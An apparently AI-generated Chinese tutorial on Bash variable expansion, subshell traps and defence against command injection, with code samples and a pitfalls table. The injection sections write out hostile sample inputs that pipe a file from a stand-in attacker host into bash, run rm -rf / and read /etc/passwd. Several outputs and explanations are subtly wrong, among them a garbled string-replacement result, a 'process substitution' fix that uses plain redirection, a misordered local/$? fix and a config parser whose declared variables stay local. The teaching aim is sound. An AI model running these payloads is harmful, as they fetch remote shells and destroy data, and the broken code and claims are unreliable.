---
title: "Shell脚本编程：变量展开与子shell陷阱"
category: "00-基础通用/05-Linux系统与命令"
tags: [Shell, Bash, 脚本编程, 子shell, 变量展开, 命令注入, 安全]
level: 主攻
type: ai-generated
status: 完成
---

# Shell脚本编程：变量展开与子shell陷阱

> 本文为合法系统管理与运维研究，从防御视角剖析 Shell 脚本编程中变量展开导致的命令注入风险、子 shell 导致的状态丢失问题以及管道/重定向的常见陷阱，帮助运维人员和安全人员编写健壮、安全的 Shell 脚本。

## 核心速查表

| 维度 | 核心内容 |
|------|----------|
| 本质定义 | 变量展开是 Shell 在命令执行前将变量引用替换为实际值的过程；子 shell 是通过管道、命令替换、括号等创建的独立执行环境，其变量修改不传播到父 shell |
| 核心用途 | 变量展开控制脚本的数据流和条件逻辑；理解子 shell 避免状态丢失和逻辑错误；防御命令注入保护脚本安全 |
| 关键参数 | `$var`, `${var}`, `${var:-default}`, `${var:+alt}`, `${var:?error}`, `$(cmd)`, `` `cmd` ``, `"$var"`, `$RANDOM`, `$PIPESTATUS`, `$?`, `set -euo pipefail`, `shopt -s expand_aliases` |
| 常见风险 | 未加引号的变量展开导致命令注入（如 rm -rf $DIR/*）；管道子 shell 导致 while/read 循环中变量修改丢失；命令替换中的注入（$() 内的恶意输入）；heredoc 中的变量意外展开 |
| 关联知识 | [[02-文件与文本命令精讲：find-xargs-sort-uniq]], [[03-grep-sed-awk三剑客进阶实战]], [[04-进程管理：ps-top-信号机制与nice]] |

## 1. 概述

Shell 脚本是 Linux 系统管理和自动化的基础工具。据调查，超过 80% 的 Linux 运维工作涉及 Shell 脚本的编写和维护。然而，Shell 语言的「隐式行为」极多——变量展开、子 shell 创建、字段分割、通配符扩展等机制在不同上下文下的行为差异，是 Shell 脚本中 bug 和安全漏洞的主要来源。

从安全角度看，Shell 脚本中的命令注入（Command Injection）是最常见的 Web 安全漏洞类型之一。当脚本将外部输入直接拼接到命令中而未经适当引用或验证时，攻击者可以通过精心构造的输入执行任意命令。例如，`curl -s "$USER_INPUT"` 在变量展开后可能执行 `$(curl attacker.com/malware | sh)` 形式的间接注入。

本文系统性地梳理 Shell 脚本编程中的变量展开规则、子 shell 创建场景、以及由此引发的安全风险，帮助开发者和运维人员编写既正确又安全的 Shell 脚本。

## 2. 核心原理

### 2.1 Shell 的执行流程

Shell 解析一条命令的完整流程如下：

1. **词法分析（Tokenization）**：将输入行拆分为 token（命令名、参数、运算符）
2. **别名展开（Alias Expansion）**：如果启用了 alias，替换已定义的别名
3. **关键字识别**：识别 `if`、`for`、`while`、`case`、`function` 等关键字
4. **变量展开（Parameter Expansion）**：`$var`、`${var}`、`$1` 等被替换为实际值
5. **命令替换（Command Substitution）**：`$(cmd)` 或 `` `cmd` `` 被替换为命令输出
6. **算术展开（Arithmetic Expansion）**：`$((expr))` 被替换为计算结果
7. **波浪号展开（Tilde Expansion）**：`~` 被替换为 HOME 目录
8. **路径名展开（Pathname Expansion）**：通配符 `*`、`?`、`[...]` 被展开为文件名
9. **字段分割（Word Splitting）**：基于 IFS（默认空格/制表符/换行）将展开结果拆分为多个 token
10. **文件名生成（Filename Generation）**：对每个 token 应用通配符模式匹配
11. **引号处理**：双引号抑制步骤 5-10（除 `$`、`` ` ``、`\`），单引号抑制全部展开

这个执行流程的复杂性在于：**展开结果会影响后续步骤**。变量展开后的值会被重新进行字段分割和通配符展开，这就是为什么 `rm -rf $DIR/*` 是危险的——如果 `$DIR` 为空，`$DIR/*` 展开为 `/*`，变成 `rm -rf /*`。

### 2.2 子 Shell 的创建机制

子 shell 是通过 fork() 系统调用创建的父 shell 的副本。以下操作会创建子 shell：

- 管道 `cmd1 | cmd2`：cmd1 和 cmd2 都在子 shell 中执行
- 命令替换 `$(cmd)`：cmd 在子 shell 中执行
- 分组命令 `(cmds)`：cmds 在子 shell 中执行（注意与 `{ cmds; }` 的区别）
- 后台执行 `cmd &`：cmd 在子 shell 中执行
- 通过 `exec` 创建的子进程

子 shell 的关键特性：
- **变量隔离**：子 shell 中的变量修改（赋值、unset）不影响父 shell
- **继承**：子 shell 继承父 shell 的所有变量（但修改不传播回来）
- **环境变量传递**：只有通过 `export` 标记的变量才能被子进程（不仅是子 shell）继承
- **I/O 继承**：子 shell 继承父 shell 的文件描述符（stdin/stdout/stderr）

### 2.3 BASH 特有的执行增强

Bash 在 POSIX sh 基础上增加了几项重要机制：

- **进程替换（Process Substitution）**：`<(cmd)` 和 `>(cmd)` 将命令的 I/O 连接到临时文件描述符，避免子 shell 问题
- **lastpipe 选项**：`shopt -s lastpipe` 让管道最后一个命令在当前 shell 中执行（需禁用 job control）
- **coproc**：创建协同进程，双向管道通信
- **Bash 数组**：只在 Bash 中支持，POSIX sh 不支持

## 3. 详细知识点

### 3.1 变量展开的多种形式

#### 3.1.1 基本变量引用

```bash
name="Alice"
echo $name      # Alice（未加引号，可能受字段分割和通配符影响）
echo "$name"    # Alice（双引号保护，防止字段分割和通配符）
echo '$name'    # $name（单引号原样输出）
echo ${name}    # Alice（花括号明确变量名边界）
echo "${name}_file"  # Alice_file（花括号分隔变量名和后续文本）
```

**引号的关键作用**：

```bash
files="file1 file2 file3"
echo $files    # file1 file2 file3（被分割成三个参数）
echo "$files"  # file1 file2 file3（作为整体传递）

# 危险示例
filename="my file.txt"
rm $filename    # 危险！实际执行: rm my file.txt（删除 my 和 file.txt 两个文件）
rm "$filename"  # 安全。实际执行: rm "my file.txt"（删除一个文件）

# 通配符展开风险
text="*.txt"
echo $text     # file1.txt file2.txt ...（通配符被展开）
echo "$text"   # *.txt（被保护，不展开）
```

#### 3.1.2 参数展开高级形式

```bash
# 默认值 ${var:-default}：var 未设置或为空时使用 default
echo "${UNDEFINED_VAR:-fallback_value}"
# 用途：配置项默认值
DB_HOST="${DB_HOST:-localhost}"
DB_PORT="${DB_PORT:-5432}"

# 替代值 ${var:+alt}：var 已设置且非空时使用 alt
echo "${TOKEN:+token_is_set}"
# 用途：条件输出
[ -n "${API_KEY}" ] && echo "API Key: ${API_KEY:+[SET]}"
echo "Debug mode: ${DEBUG:+enabled}"

# 赋默认值 ${var:=default}：var 未设置或为空时赋值并使用
: "${LOG_DIR:=/var/log/myapp}"
mkdir -p "$LOG_DIR"
# 注意：: 是空操作命令（等价于 true），用于触发赋值而不执行其他操作

# 错误提示 ${var:?message}：var 未设置或为空时输出 message 并退出
: "${DB_HOST:?DB_HOST must be set}"
# 如果 DB_HOST 未设置，输出 "DB_HOST must be set" 并以非零状态退出

# 字符串截取
str="Hello, World!"
echo "${str:0:5}"    # Hello（从位置0取5个字符）
echo "${str:7}"      # World!（从位置7到末尾）
echo "${str: -6}"    # World!（注意冒号后有空格，负数位置）

# 字符串替换
path="/home/user/docs/report.txt"
echo "${path/docs/notes}"   # /home/user/notes/report.txt（替换第一个匹配）
echo "${path//o/O}"         # /hOme/user/dOcs/rEpOrt.txt（全局替换）
echo "${path##*/}"          # report.txt（删除最长前缀匹配：贪婪删除到最后一个/）
echo "${path##*.}"          # txt（删除到最后一个.）
echo "${path%/*}"           # /home/user/docs（删除最短后缀匹配）
echo "${path%%.*}"          # /home/user/docs/report（删除到最后一个.）

# 大小写转换（Bash 4.0+）
echo "${str,,}"      # hello, world!（全部小写）
echo "${str^^}"      # HELLO, WORLD!（全部大写）
echo "${str,}"       # hello, World!（首字母小写）
echo "${str^}"       # Hello, World!（首字母大写）

# 数组操作（Bash）
arr=(one two three four five)
echo "${arr[0]}"         # one
echo "${arr[@]}"         # one two three four five
echo "${#arr[@]}"        # 5（数组长度）
echo "${arr[@]:1:2}"     # two three（切片：从索引1取2个元素）
```

#### 3.1.3 特殊变量

```bash
$0          # 脚本名称（含路径）
$1-$9       # 位置参数（第1到第9个）
${10}       # 第10个及以上的参数必须用花括号
$#          # 位置参数的个数
$@          # 所有位置参数（作为独立的单词）
$*          # 所有位置参数（作为单个字符串，以 IFS 第一个字符分隔）
$?          # 上一条命令的退出状态码
$$          # 当前 shell 的 PID
$!          # 最后一个后台命令的 PID
$_          # 上一条命令的最后一个参数
```

`$@` 和 `$*` 的区别：

```bash
set -- "hello world" "foo bar"

for arg in $*; do echo "Star: $arg"; done
# Star: hello
# Star: world     # "hello world" 被分割了！

for arg in "$*"; do echo "Star: $arg"; done
# Star: hello world foo bar  # 合并为一个字符串

for arg in "$@"; do echo "At: $arg"; done
# At: hello world   # 保留原始引号
# At: foo bar       # 保留原始引号
```

### 3.2 子 Shell 陷阱详解

#### 3.2.1 管道中的子 Shell（最常见的陷阱）

```bash
# 陷阱1：管道中 while/read 修改变量丢失
count=0
cat file.txt | while read line; do
    count=$((count + 1))
done
echo "$count"
# 输出 0！因为 while 在子 shell 中执行，count 的修改丢失

# 修复方案1：使用 process substitution（推荐）
count=0
while read line; do
    count=$((count + 1))
done < file.txt
echo "$count"
# 输出正确的行数

# 修复方案2：使用 lastpipe（Bash 4.2+）
shopt -s lastpipe
count=0
cat file.txt | while read line; do
    count=$((count + 1))
done
echo "$count"
# 正确，因为 lastpipe 让 while 在当前 shell 执行

# 修复方案3：使用 { ... } 替代管道（但注意 { 本身不创建子 shell）
count=0
{ cat file.txt; } | while read line; do
    count=$((count + 1))
done
echo "$count"
# 注意：这仍然不工作！因为 while 仍然在管道子 shell 中
# 真正有效的办法是避免管道

# 修复方案4：使用进程替换
diff <(sort file1.txt) <(sort file2.txt)
# sort 在子 shell 中执行，diff 接收两个输入
```

#### 3.2.2 命令替换中的子 Shell

```bash
# 命令替换 $(cmd) 在子 shell 中执行
value=$(echo "hello" | tr 'a-z' 'A-Z')
echo "$value"  # HELLO（正确，因为我们只关心输出）

# 陷阱：命令替换中设置的变量
result=$(echo "test")
inner_var="modified"
echo "$inner_var"
# modified（内层修改没有丢失，因为这不是子 shell 嵌套）

# 真正的陷阱场景
generate_list() {
    for i in {1..5}; do
        echo "$i"
    done
}

# 这会创建子 shell
total=0
while read num; do
    total=$((total + num))
done < <(generate_list)
echo "$total"  # 15（正确，因为 process substitution 在子 shell 但 while 在当前 shell）

# 对比：使用管道
total=0
generate_list | while read num; do
    total=$((total + num))
done
echo "$total"  # 0（total 修改丢失！）
```

#### 3.2.3 分组命令的子 Shell 对比

```bash
# ( ... ) 创建子 shell
(x=1; echo "inner: $x")
echo "outer: $x"
# 输出：
# inner: 1
# outer:         # x 在子 shell 中设置，父 shell 看不到

# { ...; } 不创建子 shell（在当前 shell 中执行）
x=1; { x=2; echo "inner: $x"; }
echo "outer: $x"
# 输出：
# inner: 2
# outer: 2      # x 修改在当前 shell 中生效

# 实际应用：子 shell 用于隔离环境
(
    cd /tmp
    source special_env.sh
    # 在子 shell 中进行的 cd 和 source 不影响当前 shell
)
# 回到原目录，原环境
```

#### 3.2.4 后台命令的子 Shell

```bash
# 后台命令在子 shell 中执行
x=100
{
    sleep 1
    x=200
    echo "background x: $x"
} &
wait
echo "foreground x: $x"
# 输出：
# background x: 200
# foreground x: 100  # 后台子 shell 的修改丢失！

# 临时文件通信方式
result_file=$(mktemp)
{
    sleep 1
    echo "computed_value" > "$result_file"
} &
wait
result=$(cat "$result_file")
rm -f "$result_file"
echo "$result"  # computed_value
```

### 3.3 命令注入与防御

#### 3.3.1 变量展开注入

```bash
# 危险：用户输入直接用于命令执行
user_input="; rm -rf /home/user"
eval "echo $user_input"
# 执行了 echo 和 rm -rf /home/user

user_input='$(curl http://attacker.com/shell.sh | bash)'
echo "Processing: $user_input"
# 如果用户输入在 $() 中被命令替换执行...

# 危险：未引用的变量 + 通配符
user_dir="*"
rm -rf $user_dir/*
# 展开为 rm -rf */*  或 rm -rf /home/*/...

# 危险：命令替换注入
filename="test; cat /etc/passwd"
cp "$filename" /tmp/
# cp: 无法获取 'test; cat /etc/passwd' 的文件状态
# 这个例子中 cp 不会执行注入，但某些命令（如 xargs）会

# 危险：xargs 注入
echo 'test' | xargs rm   # 安全
echo '$(rm -rf /)' | xargs eval  # 极度危险！
```

#### 3.3.2 安全编码实践

```bash
# 原则1：始终引用变量
rm -- "$filename"        # -- 防止文件名以 - 开头被解释为选项
cp "$src" "$dst"         # 所有变量加双引号

# 原则2：使用数组替代字符串拼接
# 危险
cmd="find $search_dir -name $pattern"
eval $cmd

# 安全
find_args=("$search_dir" -name "$pattern")
find "${find_args[@]}"

# 原则3：使用参数验证
validate_input() {
    local input="$1"
    # 只允许字母数字和有限字符
    if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
        echo "Error: Invalid input" >&2
        return 1
    fi
}

user_input="$1"
validate_input "$user_input" || exit 1
# 安全使用 $user_input

# 原则4：使用 quote 的命令替换
# 危险：未引用的命令替换
files=$(find /tmp -name "*.log")
rm $files    # 如果文件名包含空格会被分割

# 安全
while IFS= read -r file; do
    rm -- "$file"
done < <(find /tmp -name "*.log")

# 原则5：避免 eval
# 危险
config_key="PATH"
eval "echo \$$config_key"
# 如果 config_key 被注入为 "PATH; malicious_cmd" 就完蛋了

# 安全
case "$config_key" in
    PATH) echo "$PATH" ;;
    HOME) echo "$HOME" ;;
    *) echo "Unknown key" ;;
esac

# 原则6：使用 set -euo pipefail
set -euo pipefail
# -e: 命令失败时立即退出
# -u: 使用未定义变量时报错退出
# -o pipefail: 管道中任何命令失败则整个管道失败
```

#### 3.3.3 数组与引号的高级用法

```bash
# IFS 控制字段分割
IFS=: read -r user _ uid _ <<< "$(grep "^root:" /etc/passwd)"
echo "User: $user, UID: $uid"
# IFS=: 使得 read 按冒号分割

# 修改 IFS 的陷阱
OLD_IFS="$IFS"
IFS=','
data="a,b,c,d"
for item in $data; do
    echo "$item"  # a, b, c, d（正确分割）
done
IFS="$OLD_IFS"
# 注意：IFS 修改必须保存和恢复！

# 使用数组安全地构建命令
args=()
if [[ -n "$verbose" ]]; then
    args+=(-v)
fi
if [[ -n "$output_file" ]]; then
    args+=(-o "$output_file")
fi
args+=("$input_file")
command "${args[@]}"
# 所有参数都正确引用，不会被分割或展开
```

### 3.4 heredoc 与 here-string

#### 3.4.1 heredoc 变量展开控制

```bash
# 默认：heredoc 内的变量会被展开
cat << EOF
Home: $HOME
User: $USER
EOF

# 加引号的分隔符阻止展开
cat << 'EOF'
Home: $HOME    # 字面输出 $HOME
User: $USER    # 字面输出 $USER
EOF

# heredoc 与变量赋值
read -r -d '' SQL << 'EOSQL'
SELECT * FROM users WHERE name = 'test';
EOSQL
# 单引号确保 SQL 语句中的 $ 不被展开

# heredoc 在子 shell 中执行（带缩进）
cat <<-EOF
	$(date)    # 命令替换仍会被执行
	$HOME      # 变量仍会被展开
EOF
# <<- 允许使用 Tab 缩进 heredoc 内容

# heredoc 重定向到文件
cat > /tmp/config.yml << EOF
server:
  host: ${SERVER_HOST:-0.0.0.0}
  port: ${SERVER_PORT:-8080}
EOF
```

#### 3.4.2 here-string

```bash
# here-string 等价于 echo "string" | cmd
grep "error" <<< "$log_content"

# 三重括号可以包含命令替换
grep "error" <<< "$(date '+%Y-%m-%d') error log"

# 实用场景：读取多行输入
while IFS= read -r line; do
    echo "Processing: $line"
done <<< "$(cat /etc/passwd | head -5)"
```

### 3.5 高级陷阱与模式

#### 3.5.1 exit code 与 set -e 的交互

```bash
# set -e 的陷阱
set -e
false || true      # 不会退出（|| true 吃掉了错误）
false && true      # 不会退出（|| 的左侧失败是预期的）

# 但这样会导致退出
if false; then
    echo "never"
fi
# set -e 对 if 条件中的命令不生效

# set -e 与函数
risky_function() {
    false           # 这会让脚本退出！
    echo "never"    # 不会执行
}

# 防御性写法
risky_function() {
    false || return 1  # 使函数返回非零但不触发 set -e 退出
}

# set -e 与管道
set -e
false | true
# 管道默认只检查最后一个命令的退出码，set -e 不会触发
# 使用 set -o pipefail 修复
set -eo pipefail
false | true
# 现在会退出（pipefail 检测到管道中 false 的失败）
```

#### 3.5.2 陷阱处理（trap）

```bash
# trap 用于在脚本退出或收到信号时执行清理
cleanup() {
    echo "Cleaning up temp files..."
    rm -f "$tmp_file"
    echo "Done."
}

tmp_file=$(mktemp)
trap cleanup EXIT  # 脚本退出时（正常或异常）执行 cleanup
trap cleanup INT TERM  # 收到 INT/TERM 信号时执行

# 多个陷阱
trap 'echo "Got SIGHUP"' HUP
trap 'echo "Got SIGINT"; exit 1' INT
trap 'echo "Got SIGTERM"; exit 1' TERM
trap cleanup EXIT

# 临时修改并恢复 trap
old_trap=$(trap -p INT)
trap 'echo "custom handler"' INT
# ... 执行需要自定义 trap 的代码 ...
eval "$old_trap"  # 恢复原来的 trap

# trap ERR（Bash 特有，set -e 的增强）
trap 'echo "Error on line $LINENO: command exited with status $?"' ERR
```

#### 3.5.3 数据流控制模式

```bash
# 模式1：避免子 shell 的 read 循环
# 推荐：输入重定向
while IFS= read -r line; do
    echo "$line"
done < input.txt

# 模式2：避免子 shell 的计数器
count=0
while IFS= read -r line; do
    count=$((count + 1))
done < <(grep -r "pattern" /path/to/search)
echo "Found $count matches"

# 模式3：安全处理文件名（含空格和特殊字符）
find /tmp -name "*.log" -print0 | while IFS= read -r -d '' file; do
    echo "Processing: $file"
done
# -print0 用 NUL 分隔，read -d '' 读取 NUL 分隔的记录

# 模式4：使用临时文件传递数据
tmp_result=$(mktemp)
trap 'rm -f "$tmp_result"' EXIT

expensive_computation > "$tmp_result"
while IFS= read -r result_line; do
    echo "Got: $result_line"
done < "$tmp_result"

# 模式5：进程替换 vs 管道（性能差异）
# 管道（两个子 shell）
cat large.txt | sort | uniq -c | sort -rn

# 进程替换（减少子 shell）
sort < large.txt | uniq -c | sort -rn
# 注意：sort 仍在管道子 shell 中，但 cat 的进程替换消除了一个子 shell
```

## 4. 实战与示例

### 4.1 安全的配置文件解析脚本

```bash
#!/bin/bash
set -euo pipefail

# 安全解析 KEY=VALUE 格式的配置文件
parse_config() {
    local config_file="$1"

    if [[ ! -f "$config_file" ]]; then
        echo "Error: Config file not found: $config_file" >&2
        return 1
    fi

    while IFS= read -r line; do
        # 跳过空行和注释
        [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue

        # 验证格式：KEY=VALUE
        if [[ ! "$line" =~ ^[A-Za-z_][A-Za-z0-9_]*=(.*)$ ]]; then
            echo "Warning: Invalid line skipped: $line" >&2
            continue
        fi

        local key="${line%%=*}"
        local value="${line#*=}"

        # 防止代码注入：不使用 eval，使用 declare
        declare "$key=$value"
    done < "$config_file"
}

# 使用示例
parse_config "/etc/myapp.conf"
echo "DB_HOST=$DB_HOST"
echo "DB_PORT=$DB_PORT"
```

### 4.2 安全的文件批量处理

```bash
#!/bin/bash
set -euo pipefail

# 错误处理
error_handler() {
    echo "Error occurred at line $1" >&2
    exit 1
}
trap 'error_handler $LINENO' ERR

# 安全的批量文件处理（正确处理文件名中的空格和特殊字符）
process_files() {
    local search_dir="${1:?Usage: process_files <directory>}"
    local pattern="${2:-*.log}"

    if [[ ! -d "$search_dir" ]]; then
        echo "Error: Directory not found: $search_dir" >&2
        return 1
    fi

    local processed=0
    local failed=0

    while IFS= read -r -d '' file; do
        echo "Processing: $file"
        if process_single_file "$file"; then
            processed=$((processed + 1))
        else
            echo "Failed: $file" >&2
            failed=$((failed + 1))
        fi
    done < <(find "$search_dir" -maxdepth 1 -name "$pattern" -type f -print0)

    echo "Summary: processed=$processed, failed=$failed"
}

process_single_file() {
    local file="$1"
    # 文件操作示例
    local dest="${file}.processed"
    cp -- "$file" "$dest"
}

process_files "/var/log/myapp" "*.log"
```

### 4.3 变量展开注入攻防演示

```bash
#!/bin/bash
# 演示命令注入的各种场景和防御

# === 危险场景 ===

# 场景1：eval 注入
DANGEROUS_eval_demo() {
    local user_input="${1:?}"
    # 极度危险！
    # eval "$user_input"
    # 攻击者输入: "value; rm -rf /"
}

# 场景2：命令替换注入
DANGEROUS_cmdsub_demo() {
    local user_input="${1:?}"
    # 危险：如果 user_input 包含 $()
    # echo "$(process_data "$user_input")"
    # 攻击者输入: '$(curl attacker.com | bash)'
}

# 场景3：未引用变量
DANGEROUS_unquoted_demo() {
    local user_input="${1:?}"
    # 危险：文件名含空格或通配符
    # cp $user_input /tmp/  # 被分割和通配符展开
    # rm $user_input        # 极度危险
}

# === 安全场景 ===

# 正确做法1：验证输入
SAFE_validate_demo() {
    local user_input="${1:?}"
    # 白名单验证
    if [[ ! "$user_input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
        echo "Error: Invalid input" >&2
        return 1
    fi
    # 现在安全使用
    echo "Safe to use: $user_input"
}

# 正确做法2：引用变量
SAFE_quoted_demo() {
    local user_input="${1:?}"
    cp -- "$user_input" /tmp/
}

# 正确做法3：使用数组替代字符串拼接
SAFE_array_demo() {
    local -a args
    args=(-name "$1" -path "$2" -type f)
    find "${args[@]}"
}

# 正确做法4：使用 builtin 替代外部命令
SAFE_builtin_demo() {
    local dir="$1"
    # 安全：直接使用 cd，不调用外部命令
    cd -- "$dir" || return 1
    pwd
}
```

### 4.4 完整的脚本模板

```bash
#!/usr/bin/env bash
#
# Script: safe_template.sh
# Description: 安全的 Shell 脚本模板
#
set -euo pipefail
IFS=$'\n\t'

# 颜色输出
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly NC='\033[0m'

# 日志函数
log() { echo -e "${GREEN}[INFO]${NC} $*"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $*" >&2; }
error() { echo -e "${RED}[ERROR]${NC} $*" >&2; }

# 清理函数
cleanup() {
    local exit_code=$?
    if [[ -n "${tmp_dir:-}" && -d "${tmp_dir:-}" ]]; then
        rm -rf "$tmp_dir"
    fi
    exit "$exit_code"
}
trap cleanup EXIT
trap 'error "Interrupted"; exit 130' INT TERM

# 临时目录
tmp_dir=$(mktemp -d)

# 参数解析
VERBOSE=false
OUTPUT_FILE=""

usage() {
    cat << EOF
Usage: $(basename "$0") [OPTIONS] <input_file>

Options:
  -v, --verbose     Verbose output
  -o, --output FILE Output file (required)
  -h, --help        Show this help
EOF
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -v|--verbose) VERBOSE=true; shift ;;
            -o|--output)  OUTPUT_FILE="$2"; shift 2 ;;
            -h|--help)    usage; exit 0 ;;
            -*)           error "Unknown option: $1"; usage; exit 1 ;;
            *)            INPUT_FILE="$1"; shift ;;
        esac
    done

    if [[ -z "${INPUT_FILE:-}" ]]; then
        error "Input file is required"
        usage
        exit 1
    fi

    if [[ -z "$OUTPUT_FILE" ]]; then
        error "Output file is required (-o)"
        usage
        exit 1
    fi

    if [[ ! -f "$INPUT_FILE" ]]; then
        error "Input file not found: $INPUT_FILE"
        exit 1
    fi
}

# 主逻辑
main() {
    parse_args "$@"
    log "Processing: $INPUT_FILE -> $OUTPUT_FILE"

    local line_count=0
    while IFS= read -r line; do
        line_count=$((line_count + 1))
        if [[ "$VERBOSE" == true ]]; then
            log "Line $line_count: $line"
        fi
    done < "$INPUT_FILE"

    log "Processed $line_count lines"
}

main "$@"
```

## 5. 常见坑与避坑指南

| 坑点 | 表现 | 原因 | 解决方案 |
|------|------|------|----------|
| 变量为空导致命令执行异常 | `rm -rf $DIR/*` 删除了根目录文件 | DIR 未设置时 $DIR/* 展开为 /* | 使用 `${DIR:?DIR is not set}` 或 `set -u`；始终用双引号包裹变量 |
| while/read 循环中变量修改丢失 | 循环结束后计数器仍为 0 | 管道导致 while 在子 shell 中执行 | 使用 `< <(cmd)` 进程替换或 `while read ... done < file` 重定向 |
| 命令替换中的尾部换行被吞 | `$(echo -e "line1\nline2\n")` 输出两行但 `\n` 被吃掉 | 命令替换会去除尾部换行 | 使用 `$()` 配合 `IFS=` 保留空格，或使用进程替换 |
| `set -e` 意外退出 | 脚本在预期不退出的地方退出 | `set -e` 对管道中间命令、条件表达式中的失败也触发 | 使用 `cmd || true` 允许失败；理解 set -e 的例外情况 |
| `set -e` 与 `if`/`while`/`||`/`&&` 交互 | if 条件中的命令失败不退出 | Shell 规范规定条件表达式中的失败不触发 set -e | 正确利用此规则：`if cmd; then` 中的 cmd 失败不会退出 |
| heredoc 内变量被意外展开 | heredoc 中的 $ 被替换为变量值 | 默认 heredoc 展开变量 | 使用引号分隔符：`<< 'EOF'` 阻止展开 |
| `set -u` 下空数组报错 | `set -u` 时 `${arr[@]}` 对空数组报 unbound variable | Bash 4.3 之前空数组被视为未设置 | 使用 `"${arr[@]+"${arr[@]}"}"` 或升级 Bash 到 4.4+ |
| 路径含空格被分割 | `for f in $(find ...)` 文件名被拆分 | 命令替换结果被 IFS 分割 | 使用 `find ... -print0 \| while IFS= read -r -d '' f` |
| 单引号内不能包含变量 | `echo '$HOME'` 输出 `$HOME` | 单引号抑制所有展开 | 需要展开的用双引号；混合使用：`'text'$var'text'` |
| `return` 在子 shell 中无效 | 脚本在子 shell 中 `return` 报错 | 子 shell 不能用 return，只能用 exit | 确认当前是否在子 shell；用 `exit` 替代 `return` |
| `local` 声明与返回值 | `local result=$(cmd)` 的 $? 永远是 0 | local 会重置 $? 为成功 | 分两行：`result=$(cmd); local result` |
| 扩展通配符时匹配到意外文件 | `rm *.bak` 意外删除文件 | 当前目录有匹配的 .bak 文件 | 先 `echo *.bak` 确认，或用 `shopt -s nullglob` |

## 6. 知识关联

- [[02-文件与文本命令精讲：find-xargs-sort-uniq]]：find -print0 配合 IFS=read -d '' 是安全处理特殊文件名的标准模式；xargs 的 -0 选项与 find -print0 配合使用
- [[03-grep-sed-awk三剑客进阶实战]]：在管道子 shell 中使用 grep/sed/awk 时需注意变量传递问题；awk 的 BEGIN/END 块在 awk 进程内部执行，不受子 shell 影响
- [[04-进程管理：ps-top-信号机制与nice]]：trap 命令处理信号依赖于进程信号机制；理解 PID/PPID 关系有助于排查后台进程行为
- [[05-网络命令链：ip-ss-tcpdump-nmap排查实战]]：Shell 脚本中使用 tcpdump 输出解析需要处理 IFS 和字段分割；网络命令的错误码需要通过 $? 或 set -e 处理
- [[08-systemd：unit文件编写与服务管理]]：Shell 脚本作为 systemd service 的 ExecStart 时，需注意 environment 变量传递和 stdin/stdout 重定向的差异
- [[09-调试工具链：strace-ltrace-gdb基础]]：Shell 脚本的变量展开和子 shell 行为可以通过 strace 观察 fork()/execve() 调用来验证

## 7. 参考资料

- **Bash Manual**：`man bash`（权威参考，覆盖所有变量展开、子 shell 和 POSIX 兼容性细节）
- **ShellCheck**：https://www.shellcheck.net/（Shell 脚本静态分析工具，可检测大部分本文提到的陷阱）
- **GNU Bash Reference Manual**：https://www.gnu.org/software/bash/manual/bash.html
- **The GNU Bash Reference Manual - 3.5 Shell Parameter Expansion**：变量展开的完整规范
- **《鸟哥的Linux私房菜》- Shell 脚本**：http://linux.vbird.org/linux_basic/0340bash.php
- **《Pro Bash Programming》**（Chris F.A. Johnson & Jayant Varma）：Shell 脚本高级技巧
- **Advanced Bash-Scripting Guide**（Mendel Cooper）：https://tldp.org/LDP/abs/html/（经典的 Shell 脚本教程）
- **POSIX Shell Command Language**：https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html（POSIX sh 标准规范）
- **CWE-78: Improper Neutralization of Special Elements used in an OS Command**：MITRE 对 OS 命令注入的分类
- **《Software Secure Coding Practices》**：Shell 脚本安全编码实践参考
